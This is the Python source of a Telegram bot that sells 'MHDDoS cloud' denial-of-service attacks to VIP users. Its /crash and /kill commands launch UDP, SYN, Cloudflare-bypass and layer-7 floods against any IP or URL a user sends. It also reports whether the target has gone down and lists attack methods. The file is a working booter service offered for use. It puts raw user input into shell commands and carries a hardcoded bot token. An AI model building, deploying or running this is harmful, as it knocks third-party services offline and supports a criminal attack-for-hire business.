import telebot
import os
import signal
import subprocess
import requests
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Telegram Bot Token
TOKEN = "7104470318:AAF9426v-kxZVa34pA7jrXJP4xne6wCJk_E"
bot = telebot.TeleBot(TOKEN)

# Allowed Admins
ALLOWED_USERS = [5705487207]

# VIP Users and tracking
vip_users = {}
active_attacks = {}

# Function to check if the target is Down
def check_target_status(target):
    """Checks if the target is responding or down."""
    try:
        if not target.startswith("http"):
            target = f"http://{target.split(':')[0]}"
        
        start_time = time.time()
        response = requests.get(target, timeout=5)
        end_time = time.time()
        
        if response.status_code == 200:
            return f"UP ✅ (Response: {int((end_time - start_time) * 1000)}ms)"
        else:
            return f"UNSTABLE ⚠️ (Code: {response.status_code})"
    except:
        return "DOWN 💀 (No Response)"

@bot.message_handler(commands=['start'])
def handle_start_command(message):
    try:
        user_id = message.from_user.id
        days_left = vip_users.get(user_id, 0)
        status = "VIP MEMBER" if days_left > 0 else "REGULAR USER"

        text = (
            f"🤖 *WELCOME TO THE MHDDoS CLOUD*\n\n"
            f"> *ID:* `{user_id}`\n"
            f"> *STATUS:* `{status}`\n"
            f"> *EXPIRY:* `{days_left} Days`\n\n"
            f"📌 *COMMANDS:*\n"
            f"<blockquote>/crash <METHOD> <IP:PORT> <THREADS> <MS></blockquote>\n"
            f"<blockquote>/kill <URL> (L7 Auto Attack)</blockquote>\n\n"
            f"💡 *EXAMPLE:* `/crash UDP 1.1.1.1:80 10 600`"
        )

        markup = InlineKeyboardMarkup()
        creator_button = InlineKeyboardButton("📱 CREATOR", url="https://t.me/MR3SKR")
        methods_button = InlineKeyboardButton("📜 ALL METHODS", callback_data="show_methods")
        markup.add(creator_button, methods_button)

        bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        print(f"Error in start: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "show_methods")
def show_methods(call):
    methods_text = (
        f"🛡️ *MHDDoS POWERFUL METHODS*\n\n"
        f"🚀 *LAYER 7 (HTTPS/HTTP):*\n"
        f"<blockquote>GET, POST, OVH, RHEX, STOMP, BYPASS, DYN, SLOW, BOMB, CFB, CFBUAM, KILLER</blockquote>\n\n"
        f"⚔️ *LAYER 4 (TCP/UDP/VSE):*\n"
        f"<blockquote>TCP, UDP, SYN, VSE, MEM, DNS, NTP, ARD, RDP, ICMP, MINECRAFT, TS3</blockquote>\n\n"
        f"📌 *TIPS:* Use `BYPASS` for Cloudflare targets."
    )
    # Add a back button
    markup = InlineKeyboardMarkup()
    back_btn = InlineKeyboardButton("⬅️ BACK", callback_data="back_to_start")
    markup.add(back_btn)
    
    bot.edit_message_text(methods_text, chat_id=call.message.chat.id, 
                          message_id=call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "back_to_start")
def back_to_start(call):
    handle_start_command(call.message)

@bot.message_handler(commands=['crash'])
def handle_crash_command(message):
    try:
        user_id = message.from_user.id
        if vip_users.get(user_id, 0) <= 0:
            bot.reply_to(message, "🚫 *ERROR:* YOU ARE NOT A VIP USER!")
            return

        command_parts = message.text.split()
        if len(command_parts) < 5:
            bot.reply_to(message, "⚠️ *USAGE:* `/crash <TYPE> <IP:PORT> <THREADS> <MS>`", parse_mode="Markdown")
            return

        attack_type, ip_port, threads, duration = command_parts[1:5]
        
        # Checking Target BEFORE Attack
        initial_status = check_target_status(ip_port)

        # Executing MHDDoS
        command = f'python3 start.py {attack_type} {ip_port} {threads} {duration}'
        process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
        
        if user_id not in active_attacks:
            active_attacks[user_id] = {}
        active_attacks[user_id][ip_port] = process

        response = (
            f"🚀 *ATTACK IN PROGRESS*\n\n"
            f"> *TARGET:* `{ip_port}`\n"
            f"> *METHOD:* `{attack_type}`\n"
            f"> *INITIAL STATUS:* {initial_status}\n"
            f"> *TIME:* `{duration}ms`\n\n"
            f"💡 *TIP:* Wait 30s then check target again."
        )

        markup = InlineKeyboardMarkup()
        stop_button = InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_attack_{ip_port}")
        markup.add(stop_button)

        bot.send_message(message.chat.id, response, reply_markup=markup, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"SYSTEM ERROR: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_attack'))
def stop_attack(call):
    try:
        user_id = call.from_user.id
        ip_port = call.data.replace("stop_attack_", "")

        if user_id in active_attacks and ip_port in active_attacks[user_id]:
            process = active_attacks[user_id][ip_port]
            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
            del active_attacks[user_id][ip_port]
            
            bot.answer_callback_query(call.id, "ATTACK KILLED!")
            bot.send_message(call.message.chat.id, f"🛑 *ATTACK STOPPED:* `{ip_port}`", parse_mode="Markdown")
        else:
            bot.answer_callback_query(call.id, "NO ACTIVE ATTACK!")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"ERROR: {str(e)}")

@bot.message_handler(commands=['kill'])
def handle_kill_command(message):
    try:
        user_id = message.from_user.id
        if user_id not in ALLOWED_USERS and vip_users.get(user_id, 0) <= 0:
            bot.reply_to(message, "🚫 VIP REQUIRED!")
            return

        command_parts = message.text.split()
        if len(command_parts) != 2:
            bot.reply_to(message, "⚠️ *USAGE:* `/kill <URL>`")
            return

        target_url = command_parts[1]
        
        # Auto L7 Attack Logic
        kill_command = f"python3 start.py KILLER {target_url} 5 100 proxy.txt 100 300"
        process = subprocess.Popen(kill_command, shell=True, preexec_fn=os.setsid)
        
        status = check_target_status(target_url)

        bot.reply_to(message, f"✅ *L7 KILLER STARTED*\n\n> *TARGET:* {target_url}\n> *STATUS:* {status}", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"ERROR: {str(e)}")

@bot.message_handler(commands=['addvip'])
def handle_addvip_command(message):
    if message.from_user.id not in ALLOWED_USERS:
        return
    try:
        _, t_id, days = message.text.split()
        vip_users[int(t_id)] = int(days)
        bot.reply_to(message, f"⭐ *VIP ADDED:* `{t_id}` for `{days}` days\.")
    except:
        bot.reply_to(message, "⚠️ *USAGE:* `/addvip <ID> <DAYS>`")

# Important for Coolify/Docker
print("BOT IS RUNNING IN UNBUFFERED MODE...")
bot.remove_webhook()
bot.polling(none_stop=True)
